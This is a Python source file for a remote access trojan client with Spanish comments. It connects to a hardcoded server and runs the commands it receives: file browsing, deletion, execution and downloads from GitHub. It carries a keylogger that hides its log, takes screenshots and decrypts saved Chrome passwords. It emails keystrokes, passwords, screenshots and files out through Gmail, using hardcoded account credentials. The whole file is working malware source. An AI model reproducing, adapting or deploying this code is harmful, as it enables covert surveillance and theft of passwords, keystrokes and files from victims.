import socket
import subprocess
import os
import shutil  # Importar shutil para mover archivos
import psutil
import pygetwindow as gw  # Asegúrate de importar la biblioteca
import re  # Para trabajar con expresiones regulares
from colorama import init, Fore
import zipfile  # Para comprimir carpetas
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import sqlite3
import ctypes
from Crypto.Cipher import AES  # Requiere pycryptodome
import json
import win32crypt  # Requiere pywin32
import base64
import pynput
import time
from datetime import datetime
import threading
from pynput import keyboard
import random
import string
import requests
import ctypes
import subprocess
import webbrowser
from PIL import ImageGrab


# Configuración del cliente "192.168.1.139"
ip_servidor = "192.168.1.139"
puerto_servidor = 61259
contraseña_esperada = "tusmuertos"  # Contraseña que el servidor espera

keylogger_activo = "false"

log_file_path_keylogger = os.path.abspath("keylogger.txt")
screenshot_path = "screenshot.png"

def obtener_nombre_volumen(drive):
    # Utilizar ctypes para obtener el nombre del volumen
    import ctypes
    buffer = ctypes.create_unicode_buffer(1024)
    ctypes.windll.kernel32.GetVolumeInformationW(drive, buffer, 1024, None, None, None, None, 0)
    return buffer.value

def ocultar_archivo_windows(ruta):
    """Oculta un archivo o carpeta en Windows."""
    try:
        ctypes.windll.kernel32.SetFileAttributesW(ruta, 2)  # 2 es el atributo FILE_ATTRIBUTE_HIDDEN
        return True
    except Exception as e:
        print(f"{Fore.RED}Error al ocultar el archivo: {str(e)}{Fore.RESET}")
        return False

def es_archivo_oculto(archivo):
    if os.name == 'nt':  # Si el sistema es Windows
        atributos = ctypes.windll.kernel32.GetFileAttributesW(archivo)
        return atributos & 2  # FILE_ATTRIBUTE_HIDDEN
    else:  # En sistemas Unix, los archivos ocultos comienzan con '.'
        return archivo.startswith('.')

def descargar_directamente_desde_github(archivoGIT, repositorio):
    # Construimos la URL del archivo en su formato raw
    url = f'https://raw.githubusercontent.com/{repositorio}/main/{archivoGIT}'

    # Realizamos la solicitud GET para descargar el archivo
    response = requests.get(url, stream=True)

    if response.status_code == 200:
        # Obtener el nombre del archivo desde la ruta
        nombre_archivo = os.path.basename(archivoGIT)
        
        # Guardar el archivo localmente
        with open(nombre_archivo, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    
        return f"Archivo {nombre_archivo} descargado exitosamente."
    else:
        return f"Error al descargar el archivo {archivoGIT}: {response.status_code}, {response.text}"



# Eliminar el archivo antiguo si existe
if os.path.exists(log_file_path_keylogger):
    os.remove(log_file_path_keylogger)
    keylogger_activo = "true"

def keylogger_estuvoActivo():
    return keylogger_activo
    
# Abrir el archivo y si no existe lo crea
log_file = open(log_file_path_keylogger, "a+")  # Cambiado a "a+" para agregar y leer

# Evento para controlar el cierre del keylogger
keylogger_running_event = threading.Event()

# Función para ocultar el archivo

os.system(f'attrib +h "{log_file_path_keylogger}"')

# Lista donde se van a guardar las teclas presionadas
lista_teclas = []
contenido_anterior = ""  # Variable para almacenar el contenido previo

def convert(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def presiona(key):
    key1 = convert(key)
    # Filtrar las teclas de control
    if key1 in ["Key.shift", "Key.ctrl", "Key.alt", "Key.alt_gr", "Key.ctrl_l", "Key.ctrl_r", "Key.upKey" , "leftKey", "Key.delete, Key.escKey.esc, Key.esc"]:
        return
    if key1 == "Key.space":
        lista_teclas.append(" ")
    elif key1 == "Key.enter":
        lista_teclas.append("\n")
    elif key1 == "Key.backspace":
        if lista_teclas:
            lista_teclas.pop()
    else:
        lista_teclas.append(key1)

def imprimir(contenido_anterior):
    ahora = datetime.now()
    timestamp = ahora.strftime("%Y-%m-%d %H:%M:%S")
    
    teclas_nuevas = ''.join(lista_teclas)
    
    # Solo registrar si hay teclas nuevas
    if teclas_nuevas and contenido_anterior != teclas_nuevas:
        contenido = f"[{timestamp}] {teclas_nuevas}"
        
        with open(log_file_path_keylogger, "a") as log_file:
            log_file.write(contenido)
            log_file.write("\n\n")
            log_file.flush()

        # Enviar el log del keylogger por correo
        enviar_datos("keylogger")
        
        # Limpiar la lista de teclas después de registrar
        lista_teclas.clear()
        return contenido  # Actualiza el contenido anterior

    return contenido_anterior  # No se actualiza si no hay teclas nuevas



log_file_path = "contrasenas_guardadas.txt"


# Función para obtener la ruta de la base de datos de Chrome
def obtener_ruta_chrome():
    return os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")

# Función para desencriptar las contraseñas utilizando la clave maestra
def desencriptar_clave(ciphertext, clave_maestra):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(clave_maestra, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        print(f"Error al desencriptar la clave: {e}")
        return ""

# Función para obtener la clave de cifrado maestra de Chrome
def obtener_clave_maestra():
    try:
        with open(os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State"), "r") as file:
            local_state = file.read()
            local_state = json.loads(local_state)
        clave_maestra_encriptada = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        clave_maestra = win32crypt.CryptUnprotectData(clave_maestra_encriptada, None, None, None, 0)[1]
        return clave_maestra
    except Exception as e:
        print(f"Error al obtener la clave maestra: {e}")
        return None
    
def ocultar_archivo(ruta):
    # Usar ctypes para ocultar el archivo
    ctypes.windll.kernel32.SetFileAttributesW(ruta, 2)  # 2 es el atributo FILE_ATTRIBUTE_HIDDEN
    print(f"Archivo '{ruta}' ocultado exitosamente.")


# Función para extraer las contraseñas de Chrome y guardarlas en un archivo de texto
def extraer_contrasenas():
    db_path = obtener_ruta_chrome()
    db_copia = "LoginDataCopia.db"
    shutil.copyfile(db_path, db_copia)  # Hacer copia para evitar conflictos

    conn = sqlite3.connect(db_copia)
    cursor = conn.cursor()
    
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    contrasenas = cursor.fetchall()

    clave_maestra = obtener_clave_maestra()

    with open(log_file_path, "w") as f:
        for origin_url, username, password_encrypted in contrasenas:
            password_decrypted = desencriptar_clave(password_encrypted, clave_maestra)
            f.write(f"Sitio: {origin_url}\nUsuario: {username}\nContraseña: {password_decrypted}\n\n")
    
    conn.close()
    os.remove(db_copia)
    print(f"Las contraseñas se han guardado en '{log_file_path}'")

    # Marcar el archivo como oculto
    ocultar_archivo(log_file_path)

# Función para ocultar el archivo de texto

# Función para enviar el archivo con las contraseñas por correo
def enviar_datos(tipo_email):
    msg = MIMEMultipart()
    password = "qnzmluqyyagcnmxf"  # Contraseña del correo
    msg['From'] = "vladimirdontlikespam@gmail.com"  # Desde donde se va a enviar la información
    msg['To'] = "vladimirdontlikespam@gmail.com"  # Correo a donde va a llegar la información
    
    # Obtener el nombre del usuario de Windows
    nombre_usuario = os.getlogin()
    if(tipo_email == "password"):
        msg['Subject'] = f"Contraseñas guardadas de {nombre_usuario}"  # Asunto del correo con el nombre del usuario

        # Adjuntar el archivo de contraseñas al correo
        with open(log_file_path, "rb") as archivo:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(archivo.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(log_file_path)}"')
            msg.attach(part)
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(msg['From'], password)
            server.sendmail(msg['From'], msg['To'], msg.as_string())
            server.quit()
            print("Correo enviado exitosamente con el archivo adjunto")

            # Eliminar el archivo después de enviarlo
            eliminar_archivo(log_file_path)
        except Exception as e:
            print(f"Error al enviar el correo: {e}")

    elif (tipo_email == "keylogger"):
        msg['Subject'] = f"Keylogger de {nombre_usuario}"  # Asunto del correo con el nombre del usuario

        # Adjuntar el archivo del keylogger
        with open(log_file_path_keylogger, "rb") as archivo:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(archivo.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(log_file_path_keylogger)}"')
            msg.attach(part)

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(msg['From'], password)
            server.sendmail(msg['From'], msg['To'], msg.as_string())
            server.quit()
            print("Correo enviado exitosamente con el archivo adjunto")

            # Eliminar el archivo después de enviarlo (si es necesario)
            # os.remove(log_file_path)  # Descomentar si quieres eliminar el archivo después de enviar
        except Exception as e:
            print(f"Error al enviar el correo: {e}")

    elif (tipo_email == "screenshot"):
        msg['Subject'] = f"Screenshot de {nombre_usuario}"  # Asunto del correo con el nombre del usuario

        with open(screenshot_path, "rb") as archivo:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(archivo.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(screenshot_path)}"')
            msg.attach(part)

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(msg['From'], password)
            server.sendmail(msg['From'], msg['To'], msg.as_string())
            server.quit()
            print("Correo enviado exitosamente con la screenshot")

            os.remove(screenshot_path)
            # Eliminar el archivo después de enviarlo (si es necesario)
            # os.remove(log_file_path)  # Descomentar si quieres eliminar el archivo después de enviar
        except Exception as e:
            print(f"Error al enviar el correo: {e}")

def tomar_y_enviar_screenshot():
    screenshot = ImageGrab.grab()  # Captura la pantalla
    screenshot.save(screenshot_path)  # Guarda la captura temporalmente
    enviar_datos("screenshot")  # Enviar la captura de pantalla por correo


def iniciar_keylogger():
    global contenido_anterior

    with keyboard.Listener(on_press=presiona) as listener:
        while keylogger_running_event.is_set():  # Continuar mientras el evento esté activo
            contenido_anterior = imprimir(contenido_anterior)
            time.sleep(60)  # Enviar datos cada 60 segundos
        listener.stop()  # Detener el listener

def detener_keylogger():
    keylogger_running_event.clear()  # Desactivar el evento para detener el keylogger
    print("Keylogger detenido.")
    
# Función para eliminar el archivo
def eliminar_archivo(ruta):
    if os.path.exists(ruta):
        os.remove(ruta)
        print(f"Archivo '{ruta}' eliminado exitosamente.")
    else:
        print(f"El archivo '{ruta}' no existe.")


def mostrar_ruta_hasta_equipo(ruta_actual):
    """Muestra la estructura de directorios desde la ruta actual hasta 'Este Equipo' en una sola línea."""
    resultado = []
    while True:
        parent_dir = os.path.dirname(ruta_actual)
        if parent_dir == ruta_actual:  # hemos llegado a la raíz
            break
        resultado.append(os.path.basename(ruta_actual))  # Añadir el nombre del directorio
        ruta_actual = parent_dir
    resultado.append(os.path.basename(ruta_actual))  # Agregar la raíz
    return " / ".join(reversed(resultado))  # Regresar el resultado en orden correcto

def mostrar_tree():
    # Obtener la ruta actual
    ruta_actual = os.getcwd()

    # Obtener la estructura desde la raíz hasta la carpeta actual
    ruta_dividida = ruta_actual.split(os.sep)
    
    # Crear una representación de la estructura
    estructura = ""
    for i, carpeta in enumerate(ruta_dividida):
        indentacion = "   " * i
        estructura += f"{indentacion}|-- {carpeta}\n"

    # Mostrar la estructura junto con la ubicación actual
    estructura += f"\nEstás aquí: {ruta_actual}"
    
    return estructura


if keylogger_estuvoActivo() == "true":
    os.system(f'attrib +h "{log_file_path_keylogger}"')
    keylogger_running_event.set()  # Esto permite que el keylogger funcione
    tipo_email = "keylogger"
    keylogger_thread = threading.Thread(target=iniciar_keylogger)
    keylogger_thread.start()

                

def main():
    print(f"{Fore.LIGHTGREEN_EX}Intentando acceder al servidor.{Fore.RESET}")
    
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cliente.connect((ip_servidor, puerto_servidor))
    

    try:
        # Enviar la contraseña para autenticación
        print(f"{Fore.LIGHTGREEN_EX}Intentando enviar contraseña al servidor.{Fore.RESET}")
        cliente.send(contraseña_esperada.encode('utf-8'))

        # Esperar respuesta de autenticación del servidor
        respuesta = cliente.recv(1024).decode('utf-8')
        if respuesta == "Autenticación exitosa":
            print(f"{Fore.LIGHTGREEN_EX}Conexión autenticada con el servidor.{Fore.RESET}")

            # Obtener el nombre de usuario e IP del cliente
            nombre_usuario = os.getlogin()
            ip_cliente = socket.gethostbyname(socket.gethostname())

            # Enviar el nombre de usuario y la IP al servidor
            mensaje = f"{nombre_usuario};{ip_cliente}"  # Formato: "nombre_usuario;ip_cliente"
            cliente.send(mensaje.encode('utf-8'))

        while True:
            # Esperar un comando del servidor
            comando = cliente.recv(1024).decode('utf-8', errors='replace')
            if not comando:
                break

            # Ejecutar el comando en el cliente
            if comando.startswith("cd "):
                path = comando[3:]
                try:
                    os.chdir(path)
                    nueva_ruta = os.getcwd()  # Obtener la ruta actual después de cambiar el directorio
                    respuesta = f"Cambiado a directorio: {nueva_ruta}"
                except FileNotFoundError:
                    respuesta = f"Directorio no encontrado: {path}"
                except Exception as e:
                    respuesta = f"Error al cambiar de directorio: {str(e)}"

            elif comando == "dir":
                ruta_actual = os.getcwd()  # Obtener la ruta actual
                respuesta = ""  # Inicializar respuesta

                # Listar archivos en la ruta actual para verificar archivos ocultos
                try:
                    archivos = os.listdir(ruta_actual)  # Listar archivos en la ruta actual
                    
                    if not archivos:  # Verificar si no hay archivos
                        respuesta = f"{Fore.GREEN}No hay ningún archivo en la ruta actual.{Fore.RESET}"
                    else:
                        for archivo in archivos:
                            # Ruta completa del archivo
                            ruta_completa = os.path.join(ruta_actual, archivo)
                            
                            # Verificar y añadir información de archivos ocultos
                            if es_archivo_oculto(ruta_completa):
                                respuesta += f"\n{Fore.RED}{archivo} <--- Este archivo está oculto en el sistema{Fore.RESET}"
                            else:
                                respuesta += f"\n{Fore.GREEN}{archivo}{Fore.RESET}"

                except FileNotFoundError:
                    respuesta = f"{Fore.RED}Ruta no encontrada: {ruta_actual}{Fore.RESET}"
                except Exception as e:
                    respuesta = f"Error al listar archivos: {str(e)}"

            elif comando.lower() == "tasklist":
                # Inicializar la variable cada vez que se llama a tasklist
                tareas = {}
                cliente_info = None  # Para almacenar la información de cliente.exe

                for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                    try:
                        # Comprobar si el proceso está en ejecución y no es uno de los que queremos excluir
                        if proc.is_running() and proc.name() not in ["System", "Registry", "Idle", "svchost.exe", "RuntimeBroker.exe"]:
                            # Sumar el uso de memoria por nombre
                            nombre = proc.info['name']
                            uso_ram = proc.info['memory_info'].rss / (1024 ** 2)  # Convertir a MB

                            # Si el proceso ya está en el diccionario, sumar el uso de RAM; si no, agregarlo
                            if nombre in tareas:
                                tareas[nombre]['total_ram'] += uso_ram
                                tareas[nombre]['pids'].append(proc.info['pid'])
                            else:
                                tareas[nombre] = {'total_ram': uso_ram, 'pids': [proc.info['pid']]}

                            # Comprobar si es cliente.exe
                            if nombre == "cliente.exe":
                                cliente_info = (proc.info['pid'], proc.info['name'], uso_ram)

                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue

                # Convertir el diccionario a una lista y ordenar por uso de RAM (en orden descendente)
                tareas_ordenadas = [(nombre, info['total_ram'], info['pids']) for nombre, info in tareas.items()]
                tareas_ordenadas.sort(key=lambda x: x[1], reverse=True)

                # Limitar a los primeros 20 procesos
                tareas_ordenadas = tareas_ordenadas[:20]

                # Si cliente.exe no está en la lista de tareas, añadirlo en la posición 21
                if cliente_info and all(cliente_info[1] != tarea[0] for tarea in tareas_ordenadas):  # Verifica que cliente.exe no esté en tareas
                    tareas_ordenadas.append((cliente_info[1], cliente_info[2], [cliente_info[0]]))  # Añadir a la lista como cliente.exe

                # Formatear la salida
                tareas_formateadas = ""
                for nombre, memoria, pids in tareas_ordenadas:
                    tareas_formateadas += f"PID(s): {', '.join(map(str, pids))} - Nombre: {nombre} - Uso de RAM: {memoria:.2f} MB\n"  # Mostrar PID(s) y uso en MB

                respuesta = tareas_formateadas
                # Enviar la lista de aplicaciones abiertas al servidor
                cliente.send(respuesta.encode())  # Enviar la respuesta al servidor
                continue

            elif comando == "ventana":
                # Obtiene una lista de todas las ventanas abiertas
                ventanas_abiertas = gw.getAllTitles()

                # Define palabras clave que quieres filtrar
                palabras_clave_a_excluir = [
                    "Configuración",
                    "Correo",
                    "Microsoft Text Input Application",
                    "dist",
                    "Program Manager"
                ]

                # Filtra las ventanas, excluyendo las que contienen las palabras clave y las vacías
                ventanas_filtradas = [
                    ventana for ventana in ventanas_abiertas
                    if ventana.strip() and not any(palabra in ventana for palabra in palabras_clave_a_excluir)
                ]

                # Agrega lógica para detectar carpetas abiertas
                carpetas_abiertas = [
                    ventana for ventana in ventanas_abiertas
                    if "Explorador de archivos" in ventana or "File Explorer" in ventana
                ]

                # Une las listas de ventanas y carpetas filtradas
                ventanas_filtradas.extend(carpetas_abiertas)

                # Formatear las ventanas para que muestren primero el nombre de la aplicación y luego el título
                ventanas_formateadas = []
                for ventana in ventanas_filtradas:
                    # Si hay una ruta en el título (por ejemplo, C:\Windows\system32\cmd.exe), extraer solo el archivo final
                    ventana_sin_ruta = re.sub(r'[a-zA-Z]:\\[^\s]+\\', '', ventana)  # Elimina rutas de archivo
                    partes = ventana_sin_ruta.split(' - ')  # Separa el nombre de la aplicación del título de la ventana
                    
                    # Invertir el orden correctamente: primero la aplicación, luego el título
                    if len(partes) == 2:
                        ventana_formateada = f"{partes[0]} - {partes[1]}"  # Visual Studio Code - cliente.py
                    else:
                        # Si no hay un separador claro, simplemente usa el título tal cual
                        ventana_formateada = ventana_sin_ruta

                    ventanas_formateadas.append(ventana_formateada)

                # Une los títulos en una sola cadena y elimina cualquier espacio extra entre las ventanas
                respuesta = "\n".join(ventanas_formateadas) if ventanas_formateadas else "No hay ventanas abiertas relevantes."
                cliente.send(respuesta.encode())  # Envía la respuesta al servidor
                continue
            
            elif comando.lower().startswith("rename "):
                # Extraer el archivo y el nuevo nombre
                _, archivo, nombre_nuevo = comando.split(maxsplit=2)
                try:
                    # Renombrar el archivo
                    os.rename(archivo, nombre_nuevo)
                    respuesta = f"Archivo '{archivo}' renombrado a '{nombre_nuevo}'"
                except FileNotFoundError:
                    respuesta = f"Error: El archivo '{archivo}' no se encuentra."
                except Exception as e:
                    respuesta = f"Error al renombrar el archivo: {str(e)}"
                
                # Enviar respuesta al servidor
                cliente.send(respuesta.encode())
                continue

            elif comando == "pwd":
                respuesta = os.getcwd()

            elif comando == "tree":
                respuesta = mostrar_tree()

            elif comando.startswith("ver "):
                archivo = comando[4:]
                try:
                    with open(archivo, 'r', encoding='utf-8') as f:
                        contenido = f.read()
                        if not contenido:
                            respuesta = "El documento de texto está vacío."
                        else:
                            max_chars = 500
                            if len(contenido) > max_chars:
                                contenido = contenido[:max_chars] + '...'
                            respuesta = contenido
                except FileNotFoundError:
                    respuesta = f"Archivo no encontrado: {archivo}"
                except UnicodeDecodeError:
                    respuesta = "Error de codificación al leer el archivo. Intenta con un archivo de texto plano."
                except Exception as e:
                    respuesta = f"Error al leer el archivo: {str(e)}"

            elif comando.startswith("editar "):
                partes = comando.split(" ", 2)
                if len(partes) < 3:
                    respuesta = "Uso incorrecto. Usa: editar [archivo.txt] [contenido]"
                else:
                    archivo = partes[1]
                    contenido = partes[2].replace('\\n', '\n')  # Reemplaza \n por un salto de línea real
                    try:
                        with open(archivo, 'a', encoding='utf-8') as f:
                            f.write(contenido + '\n')
                        respuesta = f"Contenido añadido a {archivo}."
                    except FileNotFoundError:
                        respuesta = f"Archivo no encontrado: {archivo}"
                    except Exception as e:
                        respuesta = f"Error al editar el archivo: {str(e)}"
            elif comando.startswith("borrar "):

                ruta = comando[7:]  # Obtener la ruta del archivo o carpeta después de 'borrar '
                try:
                    if os.path.isfile(ruta):  # Verificar si es un archivo
                        os.remove(ruta)  # Intentar eliminar el archivo
                        respuesta = f"Archivo {ruta} borrado con éxito."
                    elif os.path.isdir(ruta):  # Verificar si es un directorio
                        shutil.rmtree(ruta)  # Intentar eliminar el directorio y su contenido
                        respuesta = f"Carpeta {ruta} borrada con éxito."
                    else:
                        respuesta = f"No se encontró ni archivo ni carpeta en la ruta: {ruta}"
                except FileNotFoundError:
                    respuesta = f"Archivo o carpeta no encontrado: {ruta}"
                except Exception as e:
                    respuesta = f"Error al borrar: {str(e)}"
            
            elif comando.startswith("password"):
                tipo_email = "password"
                extraer_contrasenas()
                enviar_datos(tipo_email)
                respuesta = f"{Fore.RED}Contraseñas enviadas exitosamente.{Fore.RESET}"
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("keylogger off"):
                detener_keylogger()
                respuesta = f"{Fore.RED}Keylogger detenido{Fore.RESET}"
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("keylogger"):
                # Activar el evento antes de iniciar el keylogger
                keylogger_running_event.set()  # Esto permite que el keylogger funcione

                tipo_email = "keylogger"
                os.system(f'attrib +h "{log_file_path_keylogger}"')
                keylogger_thread = threading.Thread(target=iniciar_keylogger)
                keylogger_thread.start()

                # Mensaje para indicar que se ha iniciado el keylogger
                respuesta = f"{Fore.RED}Keylogger iniciado exitosamente.{Fore.RESET}"
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("email "):
                nombre_archivo_o_carpeta = comando[6:]  # Obtener el nombre del archivo después de 'email '
                ruta_actual = os.getcwd()

                msg = MIMEMultipart()
                password = "yhbuarvnypxvbllf"  # Contraseña del correo
                msg['From'] = "vladimirdontlikespam@gmail.com"
                msg['To'] = "vladimirdontlikespam@gmail.com"
                msg['Subject'] = f"Archivo o carpeta enviado desde {nombre_usuario} de manera remota"

                try:
                    archivo_path = os.path.join(ruta_actual, nombre_archivo_o_carpeta)

                    # Verificar si es un archivo o una carpeta
                    if os.path.isdir(archivo_path):
                        # Si es una carpeta, primero la comprimimos
                        zip_name = nombre_archivo_o_carpeta + ".zip"
                        zip_path = os.path.join(ruta_actual, zip_name)
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                            # Agregar archivos de la carpeta al zip
                            for root, dirs, files in os.walk(archivo_path):
                                for file in files:
                                    file_path = os.path.join(root, file)
                                    arcname = os.path.relpath(file_path, start=archivo_path)  # Ruta relativa para la estructura de carpetas
                                    zipf.write(file_path, arcname)
                        archivo_path = zip_path  # Cambiar para que se envíe el zip
                        nombre_archivo_o_carpeta = zip_name

                    # Adjuntar el archivo o el zip creado
                    with open(archivo_path, 'rb') as archivo:
                        adjunto = MIMEBase('application', 'octet-stream')
                        adjunto.set_payload(archivo.read())
                        encoders.encode_base64(adjunto)
                        adjunto.add_header('Content-Disposition', f"attachment; filename={nombre_archivo_o_carpeta}")
                        msg.attach(adjunto)

                    # Enviar el correo
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(msg['From'], password)
                    server.sendmail(msg['From'], msg['To'], msg.as_string())
                    server.quit()
                    respuesta = f"{Fore.RED}Correo con {nombre_archivo_o_carpeta} enviado exitosamente.{Fore.RESET}"

                except Exception as e:
                    respuesta = f"{Fore.RED}Error al enviar el correo:{Fore.RESET}"
                    
            elif comando.startswith("crear_txt "):
                archivo = comando[10:]  # Obtener el nombre del archivo después de 'crear_txt '
                try:
                    with open(archivo, 'w', encoding='utf-8') as f:
                        f.write("")  # Crear un archivo vacío
                    respuesta = f"Archivo {archivo} creado con éxito."
                except Exception as e:
                    respuesta = f"Error al crear el archivo: {str(e)}"
    
            elif comando.startswith("crear "):
                carpeta = comando[6:]  # Obtener el nombre de la carpeta después de 'crear '
                try:
                    os.mkdir(carpeta)  # Crear la carpeta
                    respuesta = f"Carpeta {carpeta} creada con éxito."
                except FileExistsError:
                    respuesta = f"La carpeta {carpeta} ya existe."
                except Exception as e:
                    respuesta = f"Error al crear la carpeta: {str(e)}"

            elif comando.startswith("mover "):
                partes = comando.split(" ", 2)
                if len(partes) < 3:
                    respuesta = "Uso incorrecto. Usa: mover [archivo.txt] [ruta_o_carpeta]"
                else:
                    archivo = partes[1]
                    destino = partes[2]
                    try:
                        # Verifica si el destino es una carpeta existente o una ruta completa
                        if not os.path.isabs(destino):  # Si el destino no es una ruta absoluta
                            destino = os.path.join(os.getcwd(), destino)  # Combina con la ruta actual
                        
                        shutil.move(archivo, destino)  # Mover el archivo
                        respuesta = f"Archivo {archivo} movido a {destino} con éxito."
                    except FileNotFoundError:
                        respuesta = f"Archivo o carpeta no encontrada: {archivo}, {destino}"
                    except Exception as e:
                        respuesta = f"Error al mover el archivo: {str(e)}"

            elif comando.startswith("download "):
                archivoGIT = comando[9:].strip()  # Obtener el nombre del archivo a descargar
                repositorio = "idontlikespam/noIDEA"  # Cambia esto por tu repositorio

                # Llamar a la función para descargar el archivo
                respuesta = descargar_directamente_desde_github(archivoGIT, repositorio)
                
                # Enviar respuesta al servidor
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("screenshot"):
                tomar_y_enviar_screenshot()
                respuesta = "Screenshot realizada y enviada correctamente."
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("pendrive"):
                respuesta = f"{Fore.RED}Este equipo{mostrar_ruta_hasta_equipo(os.getcwd())}{Fore.RESET}\n"
                dispositivos = psutil.disk_partitions()

                # Verificar cada dispositivo
                for dispositivo in dispositivos:
                    # Comprobar si el dispositivo es removible o si es un disco duro externo
                    if 'removable' in dispositivo.opts or 'fixed' in dispositivo.opts:
                        nombre_volumen = obtener_nombre_volumen(dispositivo.device)
                        respuesta += f"{Fore.LIGHTGREEN_EX}{nombre_volumen} ({dispositivo.device}) - Ruta: {dispositivo.mountpoint}{Fore.RESET}\n"

                if respuesta.strip() == f"{Fore.RED}Este equipo / {mostrar_ruta_hasta_equipo(os.getcwd())}{Fore.RESET}":
                    respuesta += f"{Fore.YELLOW}No se encontraron pendrives o discos duros externos.{Fore.RESET}"

                # Enviar respuesta al servidor
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("run "):
                archivo_RUN = comando[4:].strip()  # Obtener el nombre del archivo a ejecutar
                ruta_actual = os.getcwd()  # Obtener la ruta actual
                
                # Construir la ruta completa del archivo
                ruta_archivo = os.path.join(ruta_actual, archivo_RUN)
                
                try:
                    # Intentar ejecutar el archivo
                    subprocess.Popen(ruta_archivo, shell=True)
                    respuesta = f"{Fore.RED}Archivo ejecutado correctamente: {archivo_RUN}{Fore.RESET}"
                except Exception as e:
                    respuesta = f"{Fore.RED}Error al ejecutar el archivo: {str(e)}{Fore.RESET}"

                # Enviar respuesta al servidor
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("chat "):
                chat_txt = comando[5:].strip()  # Obtener el mensaje del chat

                # Crear el comando para abrir una nueva consola y mostrar el mensaje
                mensaje_comando = f'echo {chat_txt} & pause'
                
                # Abrir una nueva ventana de consola y ejecutar el comando
                subprocess.Popen(['cmd.exe', '/c', mensaje_comando], creationflags=subprocess.CREATE_NEW_CONSOLE)

                respuesta = f"{Fore.RED}Mensaje enviado{Fore.RESET}"
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("openweb "):
                videoURL = comando[8:].strip()  # Obtener la URL
                # Abrir la URL en el navegador predeterminado
                webbrowser.open(videoURL)
                respuesta = f"{Fore.RED}Video Abierto{Fore.RESET}"
                cliente.send(respuesta.encode())
                continue

            elif comando.startswith("vanish "):
                archivo_vanish = comando[7:].strip()  # Obtener el nombre del archivo a ocultar
                ruta_actual = os.getcwd()  # Obtener la ruta actual
                ruta_archivo = os.path.join(ruta_actual, archivo_vanish)  # Ruta completa del archivo

                # Comprobar si el archivo o carpeta existe
                if os.path.exists(ruta_archivo):
                    ocultado = ocultar_archivo_windows(ruta_archivo)
                
                    if ocultado:
                        respuesta = f"{Fore.RED}Archivo ocultado exitosamente.{Fore.RESET}"
                    else:
                        respuesta = f"{Fore.RED}No se pudo ocultar el archivo.{Fore.RESET}"
                else:
                    respuesta = f"{Fore.RED}El archivo o carpeta no existe.{Fore.RESET}"

                cliente.send(respuesta.encode())
                continue
            
            elif comando.startswith("exit"):
                respuesta = f"{Fore.RED}Cerrando conexión{Fore.RESET}"
                cliente.send(respuesta.encode())
                continue

            else:
                respuesta = "Comando no reconocido."

            # Enviar la respuesta al servidor
            cliente.send(respuesta.encode('utf-8', errors='replace'))

    except Exception as e:
        print(f"Error en el cliente: {e}")
    finally:
        cliente.close()

if __name__ == "__main__":
    main()